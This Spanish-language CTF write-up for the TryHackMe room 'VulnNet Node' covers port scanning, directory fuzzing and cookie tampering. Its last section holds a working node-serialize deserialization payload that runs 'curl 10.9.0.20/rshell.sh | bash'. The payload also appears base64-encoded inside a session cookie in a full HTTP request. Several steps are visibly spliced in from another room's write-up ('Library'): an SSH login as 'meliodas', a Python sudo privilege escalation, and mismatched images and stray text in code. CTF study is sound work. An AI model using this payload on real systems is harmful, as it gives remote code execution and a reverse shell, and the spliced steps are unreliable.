---
layout: single
title: VulnNet2 Node
excerpt: "After the previous breach, VulnNet Entertainment states it won't happen again. Can you prove they're wrong?"
date: 2022-05-02
classes: wide
header:
  teaser: /assets/images/thm-writeup-vuln/vuln_logo.png
  teaser_home_page: true
  icon: /assets/images/thm_ico.png
categories:
  - TryHackMe
  - infosec
tags:
  - Security
  - Linux
  - Web
  - Javascript
  - Privilege escalation
---

![logo](/assets/images/thm-writeup-vuln/vuln_logo.png)

[Link](https://tryhackme.com/room/vulnnetnode "vuln")

VulnNet Entertainment has moved its infrastructure and now they're confident that no breach will happen again. You're tasked to prove otherwise and penetrate their network.

    Difficulty: Easy
    Web Language: JavaScript

This is again an attempt to recreate some more realistic scenario but with techniques packed into a single machine. Good luck!

    Author: SkyWaves
    Discord: SkyWaves#1397

---

## 1. Fase de reconocimiento

- Para conocer a que nos estamos enfrentando lanzamos el siguiente comando:

~~~css
ping -c 1 {ip}
~~~

![ping](/assets/images/thm-writeup-vuln/vuln_ping.png)

- De acuerdo con el ttl=63 sabemos que nos estamos enfrentando a una máquina con sistema operativo Linux.

---

## 2. Enumeración / Escaneo

- Escaneo de la totalidad de los **_65535_** puertos de red el cual guardamos en un archivo en formato **_nmap_** con el siguiente comando:

```css
└─# nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn {ip} -oN allports
```

![nmap_allports](/assets/images/thm-writeup-vuln/vuln_nmap_allports.png)

---

- De acuerdo con el escaneo anterior, se encuentran el siguiente puerto abierto; 8080 (htp)

- Escaeno de vulnerabilidades sobre los puerto 8080:

```css
nmap -v -A -sC -sV -Pn {ip} -p22,80 --script vuln

```

---

- Whatweb nos da la siguiente información:

```css
whatweb {ip}
```

![what_web](/assets/images/thm-writeup-vuln/vuln_whatweb.png)

---

- Revisión de la URL **_<http://10.10.8.158:8080>_**:

![URL](/assets/images/thm-writeup-vuln/vuln_web.png)

- Buscando el la ruta **_robots.txt_**, no se encontró nada interesante:

![URL](/assets/images/thm-writeup-vuln/vuln_robots_txt.png)

---

## 3. WFUZ

- Escaeno de subdominios con wfuzz:

```css
└─# wfuzz --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 10.10.8.158:8080/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.8.158:8080/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                         
=====================================================================
        
000000002:   200        0 L      706 W      7577 Ch     "#"                             
000000004:   200        0 L      706 W      7577 Ch     "#"                             
000000053:   200        112 L    229 W      2127 Ch     "login"                         
000000825:   200        112 L    229 W      2127 Ch     "Login"  
```

- Con el anterior escaner encotramos una página de inicio de sesión **login - Login** :

![Login](/assets/images/thm-writeup-vuln/vuln_login.png)

---

## 4 Burpsuite

![Burp](/assets/images/thm-writeup-vuln/vuln_burp_guest.png)

vuln_burp_guest.png

- Modificamos la petición con nuestra ***cookie*** modificada y obervamos en la respuesta que nos recibe como admin.
  
![Burp](/assets/images/thm-writeup-vuln/vuln_burp.png)



## 4. SSH

- Con la contraseña obtenida con **_hydra_** del usuario **_meliodas_** procedemos a establecer una conexión via **\*ssh**.

```css
└─# ssh meliodas@{ip}
```

![ssh](/assets/images/thm-writeup-library/library_ssh.png)

## 5. Bandera de usuario

- Listamos con **_ls_** y encontramos el archivo **_user.txt_**:

![usr](/assets/images/thm-writeup-library/library_usr.png)

---

## 6. Bandera root

- Búsqueda de vulnerabilidades con el comando **_sudo -l_**:

![root](/assets/images/thm-writeup-library/library_ls.png)

- Creación del binario **_zipfile.py_**, desde la máquina atacante, con el siguiente contenido que nos va a escalar una **_bash_** como root:

```css
library_ls.pngimport os

ZIP_DEFLATED = 1

def ZipFile(param1, param2, param3):
        print(os.system('/bin/bash'))
```

- Procedemos a compartirlo con un servidor en **_python_**

![root](/assets/images/thm-writeup-library/library_server.png)

---

- Descargamos el archivo creado en la máquina con **_wget_**:

![wget](/assets/images/thm-writeup-library/library_wget.png)

---

- Ejecutamos el script **_bak.py_** y obtenemos la bandera root:

![root](/assets/images/thm-writeup-library/library_root.png)

---

## 7. Fuentes

- Writeup:

<https://r4bb1t.medium.com/library-write-up-7dd5d5c5a9eb>

_$$ND_FUNC$$_function (){\n \t require('child_process').exec('curl 10.9.0.20/rshell.sh | bash', function(error, stdout, stderr) { console.log(stdout) });\n }()

eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtcbiBcdCByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnY3VybCAxMC45LjAuMjAvcnNoZWxsLnNoIHwgYmFzaCcsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO1xuIH0oKSIsImlzR3Vlc3QiOmZhbHNlLCJlbmNvZGluZyI6ICJ1dGYtOCJ9

GET / HTTP/1.1
Host: 10.10.251.107:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: session=eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtcbiBcdCByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnY3VybCAxMC45LjAuMjAvcnNoZWxsLnNoIHwgYmFzaCcsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO1xuIH0oKSIsImlzR3Vlc3QiOmZhbHNlLCJlbmNvZGluZyI6ICJ1dGYtOCJ9
Upgrade-Insecure-Requests: 1
If-None-Match: W/"1daf-dPXia8DLlOwYnTXebWSDo/Cj9Co"
Cache-Control: max-age=0
